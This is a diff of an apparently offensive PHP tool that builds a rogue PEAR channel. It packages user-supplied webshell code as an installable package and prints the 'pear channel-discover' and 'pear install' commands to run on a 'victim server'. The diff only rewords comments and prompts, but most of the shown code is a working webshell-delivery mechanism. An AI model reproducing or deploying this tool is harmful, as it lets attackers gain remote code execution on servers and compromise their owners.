@@ -36,17 +36,17 @@ while (true) {
     }
 }
 
-/* PHP web shell's file name */
-$webshell_name = trim(readline("Web shell file name? [shell.php] > "));
+/* Webshell's file name */
+$webshell_name = trim(readline("Webshell file name? [shell.php] > "));
 if ($webshell_name === "") {
     $webshell_name = "shell.php";
 } else {
     $webshell_name = basename($webshell_name);
 }
 
-/* PHP web shell code */
+/* Webshell PHP code */
 while (true) {
-    $from_file_stdin = trim(readline("Read PHP web shell code from file or from stdin? (file/stdin) [stdin] > "));
+    $from_file_stdin = trim(readline("Read PHP webshell code from file or from stdin? (file/stdin) [stdin] > "));
     if ($from_file_stdin === "file") {
         while (true) {
             $file = trim(readline("Filename? > "));
@@ -55,7 +55,7 @@ while (true) {
                     $webshell_code = file_get_contents($file);
                     break;
                 } else {
-                    file_put_contents("php://stderr", "$file does not exist or $file is unreadable.");
+                    file_put_contents("php://stderr", "$file does not exist or $file is unreadable." . PHP_EOL);
                 }
             }
         }
@@ -69,8 +69,8 @@ while (true) {
     }
 }
 
-/* The PEAR package's name, version, etc */
-$package_name = trim(readline("PEAR package's name? [Shell] > "));
+/* The PEAR package name, version, etc */
+$package_name = trim(readline("PEAR package name? [Shell] > "));
 if ($package_name === "") {
     $package_name = "Shell";
 }
@@ -84,7 +84,7 @@ if ($package_release === "") {
 }
 
 /* The channel's name alias */
-$channel_alias = trim(readline("Your channel's name alias [rogue] > "));
+$channel_alias = trim(readline("Channel name alias? [rogue] > "));
 if ($channel_alias === "") {
     $channel_alias = "rogue";
 }
@@ -100,6 +100,7 @@ $package_dir = "$package_name-$package_version";
 $tarball = "$package_name.tar";
 $tarball_url = "$server_url/get/$package_name";
 
+/* Clean old public_html and create a new one */
 chdir(__DIR__);
 if (file_exists($doc_root)) {
     rmdir_rec($doc_root);
@@ -144,7 +145,7 @@ $allreleases_xml_data = <<<EOF
 EOF;
 file_put_contents($allreleases_xml_file, $allreleases_xml_data);
 
-/* deps.0.0.0.txt */
+/* deps.VERSION.txt */
 $deps_file = "$doc_root/$rest_r/deps.$package_version.txt";
 $deps_data = serialize(array(
     "required" => array(
@@ -193,8 +194,6 @@ $info_xml_data = <<<EOF
 </p>
 EOF;
 file_put_contents($info_xml_file, $info_xml_data);
-
-/* Generate tarball */
 
 chdir("$doc_root/$get_dir");
 mkdir($package_dir);
@@ -252,10 +251,11 @@ $package_xml_data = <<<EOF
 EOF;
 file_put_contents($package_xml_file, $package_xml_data);
 
-/* shell PHP file */
+/* PHP webshell file */
 $webshell_php_file = "$package_dir/$webshell_name"; 
 file_put_contents($webshell_php_file, $webshell_code);
 
+/* Generate tarball */
 try {
     $tar = new PharData($tarball);
     $tar->addFile($package_xml_file);
@@ -272,11 +272,12 @@ unlink($webshell_php_file);
 rmdir($package_dir);
 chdir(__DIR__);
 
+/* Done */
 print(PHP_EOL);
 print("\033[92mAll Done!\033[0m" . PHP_EOL);
 print(PHP_EOL);
 print("Now you should move all the files in `public_html' to the document root (like `/var/www/html/') of your web server." . PHP_EOL);
-print("After that, try to execute the following pear commands on the victim server and download your webshell." . PHP_EOL);
+print("After that, try to execute the following PEAR commands on the victim server and download your webshell." . PHP_EOL);
 print(PHP_EOL);
 print("\033[1mpear channel-discover $hostname\033[0m" . PHP_EOL);
 print("\033[1mpear install $channel_alias/$package_name\033[0m" . PHP_EOL);
